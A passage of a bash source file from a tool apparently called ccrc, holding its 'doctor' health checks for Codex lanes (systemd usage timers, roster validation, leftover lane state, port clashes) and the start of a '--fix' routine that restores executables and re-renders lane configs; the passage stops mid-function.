_dr_codex_usage_box() {   # -> WARN findings, recorded; rc 2 if any, else 0; sets DR_CODEX_USAGE_PAIR and DR_CODEX_USAGE_BOX_NOTE
  local u rc=0
  local -a missing=()
  DR_CODEX_USAGE_PAIR=present; DR_CODEX_USAGE_BOX_NOTE=''
  if ! declare -F _codex_usage_enabled >/dev/null 2>&1; then
    _dr_fail codex "ccrc's own usage-timer reader is not loaded, so no codex lane's usage timer was measured" \
      "this is a bug in ccrc, not a fact about your box — _check_codex calls _codex_usage_enabled, declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi
  if [ "${CCD_OS:-linux}" = darwin ]; then
    DR_CODEX_USAGE_BOX_NOTE="usage publishing not applicable on macOS — ccrc places no launchd job for it (decision 17)"
    return 0
  fi
  for u in ccrc-codex-usage@.service ccrc-codex-usage@.timer; do
    [ -f "$CCRC_UNIT_DIR/$u" ] || missing+=("$u")
  done
  if [ "${#missing[@]}" -gt 0 ]; then
    DR_CODEX_USAGE_PAIR=missing
    _dr_cx_warn "ccrc's usage unit pair is not installed (${missing[*]} absent from $CCRC_UNIT_DIR), so no codex lane on this box publishes its ~/.cc-limits row" \
      "ccrc install — it places the pair and enables one usage timer per codex lane"
    rc=2
  fi
  if _codex_usage_flat_foreign; then
    _dr_cx_warn "another repository's ccgpt-usage.timer is enabled on this box; it names no lane, so ccrc cannot tell whether it is a second publisher of a codex lane's ~/.cc-limits row" \
      "if it publishes for a codex lane, disable it yourself: systemctl --user disable --now ccgpt-usage.timer — ccrc never disables another tool's unit"
    rc=2
  fi
  return "$rc"
}

_dr_codex_usage() {   # <id> -> WARN findings for this lane, recorded; rc 2 if any, else 0; sets DR_CODEX_USAGE_NOTE
  local id="$1" rc=0 t f row now en ts age
  local -a note=()
  DR_CODEX_USAGE_NOTE=''
  if [ "${CCD_OS:-linux}" = darwin ]; then
    DR_CODEX_USAGE_NOTE="usage timer not applicable on macOS"
    return 0
  fi
  t="$(_codex_usage_timer "$id")"; f="$(_codex_usage_foreign "$id")"
  # (1) WHO publishes this lane's row.
  # BOTH ARMED (Plan 3b Task A2, D-4048):
  # the converge withdraws ccrc's own while the foreign one stands, but a
  # withdrawal the manager refused, or answered while the link stayed,
  # leaves both, and "ccrc withholds its own" would be false over a link
  # that says otherwise.
  if _codex_usage_enabled "$f" && _codex_usage_enabled "$t"; then
    _dr_cx_warn "$id: another repository's $f is enabled, and ccrc's own $t is enabled too, so two publishers race this lane's ~/.cc-limits row and two token refreshes its OAuth directory" \
      "systemctl --user disable --now $t (ccrc's own unit; no ccrc fixer withdraws it), or leave it to the next update, whose converge withdraws $t while $f stands and re-measures the link. Once this lane's cutover no longer needs $f, disable it yourself: systemctl --user disable --now $f — ccrc never disables another tool's unit"
    rc=2
  elif _codex_usage_enabled "$f"; then
    _dr_cx_warn "$id: another repository's $f is enabled, so two publishers would race this lane's ~/.cc-limits row and two token refreshes its OAuth directory — ccrc withholds its own $t while it stands" \
      "once this lane's cutover no longer needs it, disable it yourself: systemctl --user disable --now $f, then run: ccrc install — ccrc never disables another tool's unit"
    rc=2
  elif _codex_usage_enabled "$t"; then
    note+=("$t enabled")
  elif [ "${DR_CODEX_USAGE_PAIR:-present}" = present ]; then
    _dr_cx_warn "$id: $t is not enabled, so this lane's ~/.cc-limits usage row is never refreshed" \
      "ccrc install — its converge enables one usage timer per codex lane"
    rc=2
  fi
  # (2) THE ROW, judged only when ccrc's timer is its writer.
  if _codex_usage_enabled "$t" && ! _codex_usage_enabled "$f"; then
    row="$HOME/.cc-limits/$id.json"
    if ! now="$(date +%s 2>/dev/null)" || ! [[ "$now" =~ ^[0-9]+$ ]]; then
      _dr_cx_warn "$id: this box's \`date\` cannot answer +%s, so the age of this lane's usage row cannot be measured" \
        "install a working GNU/BSD date — every age-based check in this file needs it"
      rc=2
    elif [ ! -e "$row" ] && [ ! -L "$row" ]; then
      en="$(_plat_mtime "$(_codex_usage_wants)/$t" 2>/dev/null)" || en=''
      if [[ "$en" =~ ^[0-9]+$ ]] && [ $((now - en)) -le "$_DR_CODEX_USAGE_STALE_S" ]; then
        note+=("no usage row yet (enabled $((now - en))s ago; the first poll runs five minutes after enable)")
      else
        _dr_cx_warn "$id: $t has been enabled for longer than $((_DR_CODEX_USAGE_STALE_S / 60)) min and this lane has never published a usage row ($row)" \
          "read what the publisher says: $(_dr_log_hint "ccrc-codex-usage@$id.service")"
        rc=2
      fi
    elif [ ! -f "$row" ]; then
      _dr_cx_warn "$id: $row is not a regular file, so this lane's usage row cannot be read" \
        "move it aside; the next poll writes a regular file there"
      rc=2
    else
      ts="$(jq -r 'if type == "object" and (.ts | type) == "number" then (.ts | floor | tostring) else empty end' "$row" 2>/dev/null)" || ts=''
      if ! [[ "$ts" =~ ^[0-9]+$ ]]; then
        _dr_cx_warn "$id: $row carries no numeric ts, so its age cannot be measured" \
          "move it aside; the next poll rewrites it — and read what the publisher says: $(_dr_log_hint "ccrc-codex-usage@$id.service")"
        rc=2
      else
        age=$((now - ts))
        if [ "$age" -gt "$_DR_CODEX_USAGE_STALE_S" ]; then
          _dr_cx_warn "$id: its usage row was last written $((age / 60)) min ago — more than three of $t's polls" \
            "read what the publisher says: $(_dr_log_hint "ccrc-codex-usage@$id.service")"
          rc=2
        else
          note+=("usage row ${age}s old")
        fi
      fi
    fi
  fi
  # (3) THE PROBE MODEL is not measured here. Task 4's `_dr_cx_lane` owns
  # both of its rows (haiku unassigned, haiku retired from the catalogue)
  # through models-op's `show`, and a second copy would print each twice.
  DR_CODEX_USAGE_NOTE="$(_dr_join ${note[@]+"${note[@]}"})"
  return "$rc"
}

# ── the usage timer ccrc left enabled for an id that is no longer a Codex lane ──
# Plan 3b Task A2 (D-4048). The rows above
# walk TODAY's codex lanes, so a flip back whose withdrawal never happened left
# `ccrc-codex-usage@<id>.timer` polling with no row to name it. Two causes: no
# `ccrc install` since the roster edit, or a disable the manager answered while
# its link stayed. That timer rewrites ~/.cc-limits/<id>.json and runs a token
# refresh against the authDir in the lane.json a flip back keeps.
# THE SET is ccrc's own reading of the manager's links (`_codex_usage_enabled_ids`,
# D-3726), which reads no roster, minus the codex lanes `_check_codex` read.
# MEASURED BEFORE the empty-population SKIP (`_check_codex`): such an id is a
# subject on its own. A set that cannot be listed (`_codex_usage_enabled_ids`
# rc 1: the shape contract is missing, which the `wrappers` check FAILs) is
# UNMEASURED, never empty, and is its own WARN. NOT APPLICABLE ON macOS
# (decision 17): ccrc places no launchd job, so there is nothing to find (rc 3).
# No systemctl call, and no file under the timer is read.
_dr_codex_usage_surplus() {   # <codex lane id>… -> rc 0 measured, 1 unlistable, 3 macOS; sets DR_CODEX_USAGE_SURPLUS
  local have e
  DR_CODEX_USAGE_SURPLUS=()
  [ "${CCD_OS:-linux}" = darwin ] && return 3
  have="$(_codex_usage_enabled_ids 2>/dev/null)" || return 1
  for e in $have; do
    _dr_cx_member "$e" "$@" || DR_CODEX_USAGE_SURPLUS+=("$e")
  done
  return 0
}

_dr_codex_usage_surplus_rows() {   # <_dr_codex_usage_surplus's rc> -> WARN findings, recorded through _dr_cx_warn
  local id t
  if [ "$1" -eq 1 ]; then
    _dr_cx_warn "ccrc's own enabled usage timers could not be listed (the wrapper shape contract could not be read), so a ccrc-codex-usage@<id>.timer left enabled for an id that is no longer a Codex lane cannot be seen — unmeasured, never none" \
      "ccrc install — the wrapper shape contract ships with ccrc, and the install places it again"
    return 0
  fi
  for id in ${DR_CODEX_USAGE_SURPLUS[@]+"${DR_CODEX_USAGE_SURPLUS[@]}"}; do
    t="$(_codex_usage_timer "$id")"
    _dr_cx_warn "$t is still enabled, and '$id' is not a Codex lane in \$HOME/.ccrc/accounts.json, so ccrc's usage publisher for '$id' runs whenever the manager starts that timer: the writer of \$HOME/.cc-limits/$id.json, and of a token refresh in the authDir its lane.json names, for a lane ccrc no longer runs" \
      "systemctl --user disable --now $t (ccrc's own unit; no ccrc fixer withdraws it), or leave it to the next update, whose converge withdraws a ccrc usage timer whose id is no longer a Codex lane and re-measures the link"
  done
  return 0
}

# ── codex: the ccrc-owned Codex lanes on this box, measured end to end ────
# Spec §12 (Plan 3a Tasks 4 and 5). ONE check, every Codex lane, and every
# finding on its OWN line with its OWN remedy — FAIL lines first, then WARN
# lines, the return code the worst of them ("ONE CHECK MAY ANSWER IN TWO
# CLASSES", this file's header) — because a lane with no authDir and a lane
# with a stale shim are two operator actions, never one bucket.
#
# THE POPULATION is the roster's `exec.kind == "codex"` rows, read by the lane
# library's ONE reader of that question (`_codex_lanes`, ccd/ccrc) — never
# accounts.sh's telemetry-keyed CCRC_CODEX_BACKEND, which names the EXTERNAL
# lanes another repository runs — plus any lane directory left under
# `_codex_lane_dir` for an id the roster no longer calls codex: a flip back to
# another launcher keeps that state on purpose, and it is WARNed, never
# silently skipped (D-3713).
#   - role `server`: SKIP, a server box converges nothing per account
#     (D-3111). CCRC_ROLE unset or unreadable reads as NOT server, as
#     `cmd_update` reads it.
#   - no roster FILE at all: SKIP. ABSENT is a positive answer, and a missing
#     roster is the `wrappers` check's FAIL (D-3723).
#   - `_codex_lanes` rc 1 (the roster cannot be read) or rc 2 (no jq): FAIL,
#     never SKIP (ruling R-C6, D-3710).
#     An unreadable roster is not an empty one, and
#     a SKIP there would read "no Codex lane" on a box that has some — the
#     overloaded null this codebase bans by name.
#   - no Codex lane and no left lane state: SKIP, never a PASS naming no lane
#     (a scan over an empty set passes everything: `_check_models`' C5).
#
# READ-ONLY, THE WHOLE WAY DOWN. Registry and catalogue facts come ONLY
# through `deploy/models-op.mjs`'s check-only answers — `show`, `materialise
# --check true` and `litellm` without `--commit` — so this file never names
# the class registry's file (single-definition.test.ts pins that count at the
# lines `_check_models` has), and no row here writes, renders, mkdirs,
# starts or stops anything. `exec.authDir` is asked for existence and mode
# ONLY: nothing under it is ever opened (spec §9).
#
# THE RUNTIME ROW TRUSTS THE STAMP (ruling R-C5,
# D-3711). `ccgpt-runtime check` compares the
# current generation's stamp with this build's LiteLLM requirement, its
# behaviour probe's hash and the installed LiteLLM version; it never re-runs
# the probe, which may take CCRC_RUNTIME_PROBE_S (300 s), and doctor closes
# every install and update. `ccgpt-runtime build` is what re-probes.
_check_codex() {
  local role=""
  # `${BOX_ENV_FILE:-}`, `-f` before `-r`: `_check_accounts`' own reading.
  # The `declare -F` is this read's OWN guard: it runs before the loaded-guard
  # below, so a table sourced without ccrc reaches that guard's FAIL rather
  # than dying here on a function that is not there.
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && declare -F _box_env_value >/dev/null 2>&1 \
    && role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$role" = server ]; then
    _dr_skip codex "this box records CCRC_ROLE=server, so it runs no Codex lane — a server box converges nothing per account"
    return 3
  fi
  # The loaded-guard `_check_update-sync` carries: every function below is
  # ccrc's own, and a table sourced by something else must say so, not die.
  # The usage rows' readers (Plan 3a Task 6) are checked HERE, before anything
  # is recorded, so a missing one can never discard a finding `_dr_cx_bins` or
  # `_dr_cx_runtime` already recorded; `_dr_codex_usage_box` keeps its own
  # guard for a caller that sources this table without ccrc.
  local fn
  for fn in _box_env_value _codex_lanes _codex_row _codex_lane_json_state _codex_lane_dir \
            _codex_litellm_yaml _codex_runtime_cli _models_node _models_roster_path _models_litellm_template \
            _codex_tier_ours _codex_tier_stale _codex_foreign_what _codex_tier_is_our_handle \
            _svc_is_active _svc_status_hint \
            _codex_usage_enabled _codex_usage_enabled_ids _codex_usage_timer _codex_usage_foreign _codex_usage_wants _codex_usage_flat_foreign \
            _plat_mtime; do
    if ! declare -F "$fn" >/dev/null 2>&1 || [ -z "${BOX_TREE_DIR:-}" ] || [ -z "${CODEX_TIERS:-}" ]; then
      _dr_fail codex "ccrc's own Codex lane library is not loaded ($fn, BOX_TREE_DIR or CODEX_TIERS is missing), so no lane on this box was measured" \
        "this is a bug in ccrc, not a fact about your box — _check_codex calls the _codex_* library declared in ccrc itself, and this check table was sourced by something that is not ccrc"
      return 1
    fi
  done
  local roster root out rc=0 id d n
  roster="$(_models_roster_path)"
  root="$(_codex_lane_dir '')"; root="${root%/}"
  local -a lanes=() left=()
  if [ -e "$roster" ] || [ -L "$roster" ]; then
    out="$(_codex_lanes 2>/dev/null)"; rc=$?
    case "$rc" in
      0) [ -z "$out" ] || mapfile -t lanes <<< "$out" ;;
      2)
        _dr_fail codex "jq is not on PATH, so which roster accounts are Codex lanes cannot be told — a box that has some would read as having none" \
          "install jq (the 'jq' check above names what is missing), then re-run doctor"
        return 1 ;;
      *)
        _dr_fail codex "\$HOME/.ccrc/accounts.json could not be read as a roster, so its Codex lanes are unknown — an unreadable roster is not an empty one" \
          "run: ccrc wrappers — it prints the roster validator's own sentence; fix what it names, then re-run doctor"
        return 1 ;;
    esac
  fi
  # Plan 3b Task A5, D-4052: a lane-state root that EXISTS (or is a link) and cannot
  # be listed — a directory this user cannot read and search, or anything
  # that is not a directory — is UNMEASURED. The glob below matches nothing
  # either way (measured: a mode-000 directory, a regular file, a dangling
  # link), so without this test such a root folded into the empty-population
  # SKIP, indistinguishable from a box with no lane state (`_check_pools`'
  # `pools-unlistable` class). A WARN by ruling A-5: nothing ccrc runs reads
  # lane state for an id that is not a codex row, and a codex row's own rows
  # below still measure its own files. An ABSENT root is an answer, not a
  # finding: the existence conjunct is what keeps it the SKIP.
  local root_unlistable=0
  if { [ -e "$root" ] || [ -L "$root" ]; } && { [ ! -d "$root" ] || [ ! -r "$root" ] || [ ! -x "$root" ]; }; then
    root_unlistable=1
  else
    for d in "$root"/*/; do
      [ -d "$d" ] || continue
      n="${d%/}"; n="${n##*/}"
      _dr_cx_member "$n" ${lanes[@]+"${lanes[@]}"} || left+=("$n")
    done
  fi
  # Plan 3b Task A2: ccrc's own usage timers left enabled for an id that is not
  # a codex lane now, measured BEFORE the empty-population SKIP. Such a timer is
  # a subject on its own, and so is a set that cannot be listed
  # (`_dr_codex_usage_surplus`, above).
  local -a DR_CODEX_USAGE_SURPLUS=()
  local surplus_rc=0
  _dr_codex_usage_surplus ${lanes[@]+"${lanes[@]}"} || surplus_rc=$?
  if [ "${#lanes[@]}" -eq 0 ] && [ "${#left[@]}" -eq 0 ] && [ "${#DR_CODEX_USAGE_SURPLUS[@]}" -eq 0 ] && [ "$surplus_rc" -ne 1 ] && [ "$root_unlistable" -eq 0 ]; then
    if [ -e "$roster" ] || [ -L "$roster" ]; then
      _dr_skip codex "no account in \$HOME/.ccrc/accounts.json is exec.kind \"codex\", and no lane state is left under $root, so there is no Codex lane to measure"
    else
      _dr_skip codex "no account roster at \$HOME/.ccrc/accounts.json and no lane state under $root, so this box has no Codex lane — the 'wrappers' check above owns a missing roster"
    fi
    return 3
  fi

  local -a DRX_CLASS=() DRX_WHAT=() DRX_FIX=() DRX_OK=() bad=()
  local -A owner=()
  local DRX_RUNTIME='' DRX_LANE_WORDS='' DRX_TIER_WORDS='' models=1 p
  local DRX_LIVE=0 DRX_UNASKED=0 DRX_UNASKED_SID='' DRX_UNREADABLE=0 DRX_UNREADABLE_SID=''
  local DR_CODEX_USAGE_PAIR=present DR_CODEX_USAGE_BOX_NOTE='' DR_CODEX_USAGE_NOTE=''
  if [ "${#lanes[@]}" -gt 0 ]; then
    _dr_cx_bins
    _dr_cx_runtime
    # Plan 3a Task 6: the box-level usage rows, once. A reader that is not
    # loaded is its own FAIL, already printed: stop there.
    _dr_codex_usage_box; [ "$?" -ne 1 ] || return 1
    if ! command -v node >/dev/null 2>&1; then
      models=0
      _dr_cx_fail "node is not on PATH, so no Codex lane's class registry, lane.json or LiteLLM config could be measured against its catalogue" \
        "install Node (the 'node' check above names what is missing), then re-run doctor"
    fi
    # EVERY ROW FIRST, then every lane. A hand-edited row, or two lanes on one
    # port, makes the whole roster one `deploy/models-op.mjs` refuses to read,
    # so no lane's model state can be measured until it is fixed — known
    # before any lane is asked, and said once, on the row's own line.
    for id in "${lanes[@]}"; do
      if ! _codex_row "$id" 2>/dev/null; then
        out="$(_codex_row "$id" 2>&1 >/dev/null)"; out="${out#"${PROG:-ccrc} codex: "}"
        _dr_cx_fail "$id's codex row cannot be used ($out), and until it is fixed no Codex lane's model state can be read — the roster does not validate" \
          "fix the row in \$HOME/.ccrc/accounts.json by hand ('ccrc wrappers' prints the roster validator's own sentence for it); ccrc never chooses a lane's ports or paths for you"
        bad+=("$id"); models=0; continue
      fi
      # Belt and braces behind `parseRoster`'s own refusal (spec §12): both
      # ports of every lane share ONE map, `shared/roster.ts`'s rule, because
      # a shim port that is another lane's LiteLLM port is as wrong as two
      # shim ports.
      for p in "$CX_PROXY" "$CX_LITELLM"; do
        if [ -n "${owner[$p]:-}" ] && [ "${owner[$p]}" != "$id" ]; then
          _dr_cx_fail "${owner[$p]} and $id both use port $p, so one lane's requests would reach the other lane's OAuth — and until it is fixed no Codex lane's model state can be read (the roster does not validate)" \
            "give each Codex lane its own two ports in \$HOME/.ccrc/accounts.json by hand; ccrc never chooses a port"
          bad+=("$id" "${owner[$p]}"); models=0
        else
          owner[$p]="$id"
        fi
      done
    done
    for id in "${lanes[@]}"; do
      _dr_cx_member "$id" ${bad[@]+"${bad[@]}"} && continue
      _dr_cx_lane "$id" "$models" "$roster"
      _dr_cx_tiers "$id"
      _dr_codex_usage "$id"
      DRX_OK+=("$id ($DRX_LANE_WORDS; $DRX_TIER_WORDS${DR_CODEX_USAGE_NOTE:+; $DR_CODEX_USAGE_NOTE})")
    done
  fi
  local left_reads
  for n in ${left[@]+"${left[@]}"}; do
    # Plan 3b Task A2: the publisher reads this lane.json, so "nothing of ccrc's
    # reads it" is said only when the enabled set WAS listed and no ccrc usage
    # timer is enabled for '$n'. A set that could not be listed (`surplus_rc` 1)
    # is unmeasured, never none (fix round 1): the empty array it leaves is not
    # the empty set, and the WARN on that set says why.
    left_reads="nothing of ccrc's reads it while '$n' is not a Codex lane"
    if [ "$surplus_rc" -eq 1 ]; then
      left_reads="whether ccrc's own usage timer still reads it is unmeasured (the WARN on ccrc's enabled usage timers says why)"
    elif _dr_cx_member "$n" ${DR_CODEX_USAGE_SURPLUS[@]+"${DR_CODEX_USAGE_SURPLUS[@]}"}; then
      left_reads="ccrc's own $(_codex_usage_timer "$n") still reads it (the WARN naming that timer says how to withdraw it)"
    fi
    _dr_cx_warn "lane state is left under $root/$n, and '$n' is not a Codex lane in \$HOME/.ccrc/accounts.json — a flip back to another launcher keeps it on purpose, and $left_reads" \
      "if the flip back is final and ccrc runs nothing for '$n' any more (its tiers were stopped with 'ccrc codex stop $n' before the flip), remove $root/$n by hand; ccrc never deletes a lane's state on a flip"
  done
  if [ "$root_unlistable" -eq 1 ]; then
    _dr_cx_warn "$root exists and cannot be listed (it is not a directory this user can read and search), so whether any Codex lane state is left under it was not measured — unmeasured, never read as no lane state" \
      "make it a directory this user can list again (ccrc creates it with mode 0700: chmod 700 $root), or move aside by hand whatever sits there, then re-run doctor; ccrc never changes or removes it for you"
  fi
  _dr_codex_usage_surplus_rows "$surplus_rc"
  _dr_cx_report "${#lanes[@]} Codex lane(s): $(_dr_cx_join ', ' ${DRX_OK[@]+"${DRX_OK[@]}"}); runtime ${DRX_RUNTIME:-unmeasured}; the four GPT-lane executables match the shipped tree${DR_CODEX_USAGE_BOX_NOTE:+; $DR_CODEX_USAGE_BOX_NOTE}"
}

# ── _fix_codex — the cure `ccrc doctor --fix` runs for `codex` ────────────
# Spec §12's `--fix` list, as Plan 3a Task 8 lands it. cmd_doctor calls a
# fixer ONLY when its check FAILED (its `"$rc" -eq 1` guard) and then
# measures AGAIN; the verdict is that second measurement, never this
# function's word (`_fix_skills`' rule). Two rows of §12's list
# therefore live elsewhere: a missing or disabled usage timer is a WARN,
# which never reaches a fixer, so its remedy names `ccrc install`, whose
# converge is that unit's one enabler (D-3721);
# and the launcher is `_check_wrappers`' measurement, so its cure is
# `_fix_wrappers` (D-3730).
#
# WHAT IT DOES, each through the shipped tree's own installer step or the
# lane library's own writer — never a copy of either:
#   1. a GPT-lane executable (`CODEX_LANE_BINS`, the list `_check_codex`
#      compares) that is missing, not executable, or not byte-identical to
#      $BOX_TREE_DIR/ccd/<name> is placed again by `_inst_atomic`, the
#      primitive `_inst_bins` places it with. With no `cmp` on PATH nothing
#      can say whether a present file's bytes differ (`_dr_cx_bins`' own
#      reading), so only a missing or non-executable file is placed, and
#      every other is named "not compared";
#   2. a runtime `ccgpt-runtime check` refuses is rebuilt and re-probed by
#      `ccgpt-runtime build` — the stamp is trusted until then
#      (D-3711, Task 4);
#   3. per lane, under its lane lock: lane.json is re-rendered by its ONE
#      writer, models-op's `materialise` (no `--check`), when it is stale
#      against the roster (`_codex_lane_json_state`) or against the class
#      registry (`materialise --check true`, R7); and litellm.yaml is
#      re-rendered through the codex arm's own body,
#      `_models_litellm_lane_held`, whose compare makes a converged file a
#      no-op and whose gate stops and starts only a tier it proves this
#      lane's (the identity gate every stop path shares);
#   4. only when step 1 replaced the BYTES (measured by `cmp`, never a
#      mode-only fix or a compare that could not run) of one of the two
#      files a running tier's identity is computed from — the shim
#      (`_codex_shim_file`) or the runtime CLI (`_codex_runtime_cli`), per
#      `_codex_started_json` — or step 2 rebuilt the runtime:
#      `_inst_codex_tiers`, the install step `ccrc install` and `ccrc update`
#      run. ccgpt-usage.py and ccrc-codex are code no tier runs, so they
#      never ask it. That step restarts a tier only when it is ccrc's own,
#      running and measures stale, and it asks EVERY codex lane: so once it
#      runs, a ccrc-owned tier on any lane that measures stale for any other
#      reason is restarted too — exactly what `ccrc update` would do (the
#      residue D-3721's entry names; ruled, not cured).
# WHAT IT NEVER DOES: edit the roster or choose a port (a row that does not
# validate is named and left); run OAuth (`ccrc codex login <id>` is the
# remedy the check prints); open anything under an authDir; signal a process
# it cannot prove is a lane's (every stop is behind `_codex_tier_ours`,
# inside steps 3 and 4); enable or disable any unit; overwrite a launcher;
# delete anything.
#
# THE WHOLE CURE RUNS IN A SUBSHELL. cmd_doctor runs each CHECK in a
# subshell but calls the FIXER in its own shell, and the library this calls
# can end the shell it runs in: `_ccrc_die` and `_models_refuse` exit, and an
# unbound variable is fatal under `set -u`. Called bare, any of those would
# end the doctor run before the re-measurement it exists for. Each lane's
# work is a nested subshell as well, so its lane lock is released as that
# lane ends — through `_codex_unlock`, the lock's only release, or by the
# subshell's own exit if the lane's work dies first — and no descriptor
# reaches the next lane or the re-measurement.
_fix_codex() {
  (
    local role="" lanes lrc=0 n src dst rt id replaced=0 cmp_ok=1 bytes
    local -a ids=() missing=()
    for n in _codex_lanes _codex_row _codex_lane_json_state _codex_lock _codex_unlock \
             _codex_shim_file _codex_runtime_cli _models_node _models_roster_path _models_litellm_lane_held \
             _inst_atomic _inst_codex_tiers _box_env_value; do
      declare -F "$n" >/dev/null 2>&1 || missing+=("$n")
    done
    declare -p CODEX_LANE_BINS >/dev/null 2>&1 || missing+=(CODEX_LANE_BINS)
    if [ "${#missing[@]}" -gt 0 ]; then
      echo "FIX codex: refused — ccrc's own $(_dr_join "${missing[@]}") is not loaded, so nothing was cured; this is a bug in ccrc, not a fact about your box (the check table was sourced by something that is not ccrc)"
      exit 1
    fi
    # -f BEFORE -r, as `_check_skills` reads it. `_check_codex`
    # SKIPs a server box, so cmd_doctor never calls this there; the refusal
    # is for any other caller, because `_inst_bins` places no GPT-lane
    # executable on a server box and step 1 must not either.
    [ -f "${BOX_ENV_FILE:-}" ] && [ -r "$BOX_ENV_FILE" ] && role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
    if [ "$role" = server ]; then
      echo "FIX codex: refused — this box records CCRC_ROLE=server, which converges nothing per account, so nothing was cured"
      exit 1
    fi
    # An unreadable roster (rc 1) and a missing jq (rc 2) are not "no codex
    # lane": each is the check's own FAIL, and nothing here can cure either.
    lanes="$(_codex_lanes)" || lrc=$?
    if [ "$lrc" -ne 0 ]; then
      echo "FIX codex: refused — which roster lanes are codex lanes could not be read (the ccrc codex: line above says why), so nothing was cured"
      exit 1
    fi
    [ -z "$lanes" ] || mapfile -t ids <<<"$lanes"
    if [ "${#ids[@]}" -eq 0 ]; then
      echo "FIX codex: nothing to cure — no codex lane in the roster"
      exit 0
    fi

    # 1. The executables, from the shipped tree, by the installer's own primitive.
    # `bytes` is what `cmp` measured BEFORE the placement: 1 the bytes differ
    # (or the file is absent or unreadable), 0 the same bytes with the wrong
    # mode (`_inst_atomic` then only chmods), `unmeasured` with no `cmp`.
    # Only a measured 1 on a file a tier runs asks step 4 (`replaced`).
    command -v cmp >/dev/null 2>&1 || cmp_ok=0
    for n in ${CODEX_LANE_BINS[*]}; do
      src="$BOX_TREE_DIR/ccd/$n"; dst="$HOME/.local/bin/$n"
      if [ ! -f "$src" ]; then
        echo "FIX codex: $n: not restored — the shipped tree has no \$HOME/ccrc/ccd/$n; run 'ccrc update' (or 'ccrc install' from a checkout) to place it"
        continue
      fi
      if [ "$cmp_ok" -eq 1 ]; then
        if cmp -s "$src" "$dst" 2>/dev/null; then
          [ -x "$dst" ] && continue
          bytes=0
        else
          bytes=1
        fi
      elif [ -f "$dst" ] && [ -x "$dst" ]; then
        echo "FIX codex: $n: not compared — cmp is not on PATH, so \$HOME/.local/bin/$n was left as it is; install diffutils (it ships cmp), then re-run 'ccrc doctor --fix'"
        continue
      else
        bytes=unmeasured
      fi
      if ( mkdir -p "${dst%/*}" && _inst_atomic "$src" "$dst" 755 ); then
        case "$bytes" in
          1)
            echo "FIX codex: restored \$HOME/.local/bin/$n from the shipped tree"
            # The two files a running tier's identity is computed from
            # (`_codex_started_json`): the shim a shim tier runs, and the
            # runtime CLI that names every tier's generation.
            if [ "$dst" = "$(_codex_shim_file)" ] || [ "$dst" = "$(_codex_runtime_cli)" ]; then
              replaced=1
            fi ;;
          0)
            echo "FIX codex: made \$HOME/.local/bin/$n executable (0755) — its bytes already were the shipped tree's" ;;
          *)
            echo "FIX codex: placed \$HOME/.local/bin/$n from the shipped tree — it was missing or not executable, and with no cmp on PATH whether its bytes changed was not measured, so no tier is restarted for it" ;;
        esac
      else
        echo "FIX codex: $n: not restored — the install step refused (its line above says why)"
      fi
    done

    # 2. The runtime: rebuilt only when its own check refuses.
    rt="$(_codex_runtime_cli)"
    if [ ! -x "$rt" ]; then
      echo "FIX codex: runtime: not rebuilt — \$HOME/.local/bin/ccgpt-runtime is not on this box (the lines above say why)"
    elif ! "$rt" check >/dev/null 2>&1; then
      echo "FIX codex: runtime: rebuilding with 'ccgpt-runtime build' — pip may take minutes"
      if "$rt" build >/dev/null && "$rt" check >/dev/null 2>&1; then
        echo "FIX codex: runtime: rebuilt, probed and current"
        replaced=1
      else
        echo "FIX codex: runtime: NOT rebuilt — 'ccgpt-runtime build' did not leave a current runtime (its reason is the ccgpt-runtime line on stderr), so the previous one, if any, stays current"
      fi
    fi

    # 3. Each lane's files, under its lane lock.
    for id in "${ids[@]}"; do
      [ -n "$id" ] || continue
      (
        local st chk ans rc err detail body roster
        roster="$(_models_roster_path)"
        if ! _codex_row "$id" >/dev/null; then
          echo "FIX codex: $id: nothing cured — its roster row does not validate (the ccrc codex: line above says why), and --fix never edits the roster or chooses a port"
          exit 0
        fi
        if ! _codex_lock "$id"; then
          echo "FIX codex: $id: nothing cured — its lane lock could not be taken (the line above says why); re-run 'ccrc doctor --fix' once it is free"
          exit 0
        fi
        st="$(_codex_lane_json_state "$id")" || st=unmeasured
        chk="$(_models_node materialise --file "$roster" --id "$id" --check true 2>/dev/null)" || chk=""
        if [ "$st" != current ] \
           || ! printf '%s' "$chk" | jq -e '.ok == true and .check == true and .changed.lane == false' >/dev/null 2>&1; then
          ans="$(_models_node materialise --file "$roster" --id "$id" 2>/dev/null)"; rc=$?
          if [ "$rc" -eq 0 ] && printf '%s' "$ans" | jq -e '.ok == true and (.wrote.lane | type) == "string"' >/dev/null 2>&1; then
            echo "FIX codex: $id: lane.json re-rendered from the roster and this lane's class registry"
          elif [ "$rc" -eq 0 ] && printf '%s' "$ans" | jq -e '.ok == true and .wrote == null' >/dev/null 2>&1; then
            echo "FIX codex: $id: lane.json NOT rendered — this lane has no class registry, and lane.json is rendered from it; run: ccrc models $id init codex"
          else
            err="$(printf '%s' "$ans" | jq -r '.error // empty' 2>/dev/null)"
            detail="$(printf '%s' "$ans" | jq -r '.detail // empty' 2>/dev/null)"
            echo "FIX codex: $id: lane.json NOT rendered — deploy/models-op.mjs answered ${err:-exit $rc}${detail:+: $detail}"
          fi
        fi
        # Its own subshell: the codex arm's body ends a refusal with
        # `_models_refuse`, which exits. The lock this lane holds is its
        # precondition, and a subshell inherits it.
        body="$( _models_litellm_lane_held "$id" 2>/dev/null )"; rc=$?
        body="${body##*$'\n'}"
        if [ "$rc" -ne 0 ]; then
          err="$(printf '%s' "$body" | jq -r '.error // empty' 2>/dev/null)"
          detail="$(printf '%s' "$body" | jq -r '.detail // empty' 2>/dev/null)"
          echo "FIX codex: $id: litellm.yaml NOT rendered — ${err:-the render exited $rc}${detail:+: $detail}"
        elif printf '%s' "$body" | jq -e '.changed == true and .restarted == true' >/dev/null 2>&1; then
          echo "FIX codex: $id: litellm.yaml re-rendered, and this lane's own LiteLLM tier restarted onto it"
        elif printf '%s' "$body" | jq -e '.changed == true' >/dev/null 2>&1; then
          echo "FIX codex: $id: litellm.yaml re-rendered"
        fi
        _codex_unlock
      )
    done

    # 4. The tiers — only when this run replaced the bytes of the shim or the
    # runtime CLI, or rebuilt the runtime (step 1's `replaced`, step 2's).
    if [ "$replaced" -eq 1 ]; then
      if ( INST_ROLE="${role:-both}"; INST_DEGRADED=(); _inst_codex_tiers; [ "${#INST_DEGRADED[@]}" -eq 0 ] ); then
